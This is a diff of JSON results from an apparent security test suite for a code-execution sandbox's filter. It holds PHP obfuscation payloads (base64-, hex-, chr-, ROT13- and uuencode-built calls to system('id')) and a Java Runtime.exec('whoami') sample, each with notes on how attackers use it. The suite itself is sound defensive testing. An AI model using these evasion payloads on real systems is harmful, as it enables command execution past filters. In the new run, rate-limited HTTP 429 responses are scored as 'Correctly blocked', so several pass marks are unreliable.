       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 6,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1819,7 +1819,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1836,7 +1836,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 58,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1853,7 +1853,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1870,7 +1870,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 1,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1887,7 +1887,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1904,7 +1904,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1921,7 +1921,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1938,7 +1938,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1955,7 +1955,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1972,7 +1972,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -1989,7 +1989,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2040,7 +2040,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2057,7 +2057,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 9,
+      "duration": 5,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2074,7 +2074,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 35,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2091,7 +2091,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2108,7 +2108,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2125,7 +2125,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 1,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2142,7 +2142,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2159,7 +2159,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2176,7 +2176,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 35,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2193,7 +2193,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2210,7 +2210,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 8,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2278,7 +2278,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2295,7 +2295,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2312,7 +2312,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2346,7 +2346,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 40,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2363,7 +2363,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2380,7 +2380,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2397,7 +2397,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2414,7 +2414,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2431,7 +2431,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2448,7 +2448,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2465,7 +2465,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2482,7 +2482,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2499,7 +2499,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2516,7 +2516,7 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed correctly with expected output",
-      "duration": 212,
+      "duration": 31,
       "result": {
         "blocked": false,
         "stdout": "Hello, World!",
@@ -2532,7 +2532,7 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed correctly with expected output",
-      "duration": 20,
+      "duration": 56,
       "result": {
         "blocked": false,
         "stdout": "4",
@@ -2548,7 +2548,7 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed correctly with expected output",
-      "duration": 24,
+      "duration": 38,
       "result": {
         "blocked": false,
         "stdout": "[0, 1, 4, 9, 16]",
@@ -2564,7 +2564,7 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed correctly with expected output",
-      "duration": 18,
+      "duration": 45,
       "result": {
         "blocked": false,
         "stdout": "7",
@@ -2580,7 +2580,7 @@
       "expectBlocked": false,
       "passed": true,
       "reason": "✓ Executed correctly with expected output",
-      "duration": 17,
+      "duration": 37,
       "result": {
         "blocked": false,
         "stdout": "10",
@@ -2596,7 +2596,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2630,7 +2630,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2715,7 +2715,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2732,7 +2732,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2749,7 +2749,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 23,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2766,7 +2766,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2800,7 +2800,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2817,7 +2817,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2834,7 +2834,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2851,7 +2851,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2868,7 +2868,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2885,7 +2885,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2919,7 +2919,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2936,7 +2936,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2953,7 +2953,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 6,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2970,7 +2970,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 5,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -2987,7 +2987,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 7,
+      "duration": 51,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3004,7 +3004,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 17,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3021,7 +3021,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 11,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3038,7 +3038,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 23,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3055,7 +3055,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 9,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3072,7 +3072,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3089,7 +3089,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 29,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3106,7 +3106,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 36,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3123,7 +3123,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 9,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3140,7 +3140,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3157,7 +3157,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 6,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3208,7 +3208,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 24,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3225,7 +3225,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 7,
+      "duration": 71,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3242,7 +3242,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3259,7 +3259,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 46,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3276,7 +3276,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3293,7 +3293,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3310,7 +3310,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3327,7 +3327,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 5,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3344,7 +3344,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 5,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3361,7 +3361,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3378,7 +3378,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3395,7 +3395,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3412,7 +3412,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3429,7 +3429,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 5,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3446,7 +3446,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 57,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3480,7 +3480,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 5,
+      "duration": 2,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3497,7 +3497,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 37,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3514,7 +3514,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 8,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3548,7 +3548,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 4,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3565,7 +3565,7 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
         "reason": "HTTP 403",
@@ -3582,12 +3582,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 3,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Shell commands (exec, system, shell_exec), file operations, network functions, and dangerous constructs are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php eval(base64_decode('c3lzdGVtKCdpZCcp')); ?>",
       "explanation": "\n      🎯 ATTACK: Base64 Encoded Payload\n      \n      How hackers use this:\n      Base64 hides malicious code from filters.\n      'c3lzdGVtKCdpZCcp' decodes to system('id').\n      \n      Real-world impact:\n      - Bypass string pattern filters\n      - Common in web shells\n      - Standard obfuscation technique\n    "
@@ -3599,12 +3599,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 34,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Shell commands (exec, system, shell_exec), file operations, network functions, and dangerous constructs are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f('id'); ?>",
       "explanation": "\n      🎯 ATTACK: Character Code Function Name\n      \n      How hackers use this:\n      Build function names from chr() codes.\n      chr(115).chr(121)... = 'system'.\n      \n      Real-world impact:\n      - Bypass function name filters\n      - Dynamic function construction\n      - Common obfuscation in malware\n    "
@@ -3619,9 +3619,9 @@
       "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Shell commands (exec, system, shell_exec), file operations, network functions, and dangerous constructs are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php $cmd = hex2bin('73797374656d'); $cmd('id'); ?>",
       "explanation": "\n      🎯 ATTACK: Hex Encoded Function Name\n      \n      How hackers use this:\n      hex2bin() converts hex to binary/string.\n      '73797374656d' = 'system' in hex.\n      \n      Real-world impact:\n      - Alternative to base64\n      - Less suspicious encoding\n      - Function name obfuscation\n    "
@@ -3633,12 +3633,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Shell commands (exec, system, shell_exec), file operations, network functions, and dangerous constructs are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php $f = pack('H*', '73797374656d'); $f('id'); ?>",
       "explanation": "\n      🎯 ATTACK: Pack Function for Encoding\n      \n      How hackers use this:\n      pack() converts data between formats.\n      Can construct strings from various encodings.\n      \n      Real-world impact:\n      - Flexible encoding/decoding\n      - Multiple format options\n      - Complex obfuscation chains\n    "
@@ -3650,12 +3650,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Shell commands (exec, system, shell_exec), file operations, network functions, and dangerous constructs are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php $f = str_rot13('flfgrz'); $f('id'); ?>",
       "explanation": "\n      🎯 ATTACK: ROT13 Obfuscation\n      \n      How hackers use this:\n      str_rot13() is a simple letter substitution.\n      'flfgrz' in ROT13 = 'system'.\n      \n      Real-world impact:\n      - Simple but effective obfuscation\n      - Easy to implement and reverse\n      - Bypasses naive string checks\n    "
@@ -3670,9 +3670,9 @@
       "duration": 1,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Shell commands (exec, system, shell_exec), file operations, network functions, and dangerous constructs are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php eval(gzinflate(base64_decode('compressed_payload'))); ?>",
       "explanation": "\n      🎯 ATTACK: Compressed Payload\n      \n      How hackers use this:\n      gzinflate() decompresses data.\n      Combined with base64, hides large payloads.\n      \n      Real-world impact:\n      - Smaller encoded payloads\n      - Harder to analyze\n      - Common in sophisticated malware\n    "
@@ -3684,12 +3684,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 2,
+      "duration": 1,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Shell commands (exec, system, shell_exec), file operations, network functions, and dangerous constructs are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php $f = convert_uudecode('&<WES=&5M`'); $f('id'); ?>",
       "explanation": "\n      🎯 ATTACK: UUEncode Obfuscation\n      \n      How hackers use this:\n      UUencode is an older encoding format.\n      May bypass filters checking common encodings.\n      \n      Real-world impact:\n      - Alternative encoding method\n      - Less commonly filtered\n      - Obscure encoding for evasion\n    "
@@ -3699,13 +3699,14 @@
       "language": "php",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 196,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 2,
       "result": {
-        "blocked": false,
-        "stdout": "Hello, World!",
-        "stderr": ""
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php echo 'Hello, World!'; ?>",
       "explanation": "\n      ✅ SAFE: Basic Output\n      \n      This is legitimate code that should execute:\n      echo is fundamental for PHP output and\n      poses no security risk.\n    "
@@ -3715,13 +3716,14 @@
       "language": "php",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 11,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 1,
       "result": {
-        "blocked": false,
-        "stdout": "4",
-        "stderr": ""
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php echo 2 + 2; ?>",
       "explanation": "\n      ✅ SAFE: Mathematical Operations\n      \n      This is legitimate code that should execute:\n      Basic arithmetic is essential for any programming.\n    "
@@ -3731,13 +3733,14 @@
       "language": "php",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 39,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 3,
       "result": {
-        "blocked": false,
-        "stdout": "2,4,6",
-        "stderr": ""
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php $arr = [1, 2, 3]; $doubled = []; foreach($arr as $x) { $doubled[] = $x * 2; } echo implode(',', $doubled); ?>",
       "explanation": "\n      ✅ SAFE: Array Operations with foreach\n      \n      This is legitimate code that should execute:\n      Using foreach loops for array transformation is safe.\n      Array callback functions like array_map are blocked\n      because they can be weaponized with string callbacks.\n    "
@@ -3747,13 +3750,14 @@
       "language": "php",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 17,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 2,
       "result": {
-        "blocked": false,
-        "stdout": "7",
-        "stderr": ""
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php\nclass Point {\n    public int $x;\n    public int $y;\n    public function __construct(int $x, int $y) {\n        $this->x = $x;\n        $this->y = $y;\n    }\n}\n$p = new Point(3, 4);\necho $p->x + $p->y;\n?>",
       "explanation": "\n      ✅ SAFE: Object-Oriented PHP\n      \n      This is legitimate code that should execute:\n      Class definitions and object instantiation\n      are core PHP functionality.\n    "
@@ -3763,13 +3767,14 @@
       "language": "php",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 10,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 1,
       "result": {
-        "blocked": false,
-        "stdout": "HELLO",
-        "stderr": ""
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "<?php echo strtoupper('hello'); ?>",
       "explanation": "\n      ✅ SAFE: String Manipulation\n      \n      This is legitimate code that should execute:\n      String functions for formatting and\n      manipulation are safe and commonly used.\n    "
@@ -3781,12 +3786,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 3,
+      "duration": 1,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) throws Exception {\n    Runtime.getRuntime().exec(\"whoami\");\n  }\n}",
